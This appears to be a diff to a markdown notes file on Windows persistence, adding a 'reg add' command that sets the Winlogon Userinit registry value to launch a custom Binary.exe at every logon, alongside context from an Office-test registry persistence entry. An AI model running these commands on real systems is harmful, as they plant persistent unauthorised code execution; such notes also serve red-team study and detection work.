@@ -31,8 +31,7 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_S
 ```
 ### 
 ```
-dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Users\KarMarKhaing\Binary.exe","C:\Windows\system32\userinit.exe"
 
 ```
 
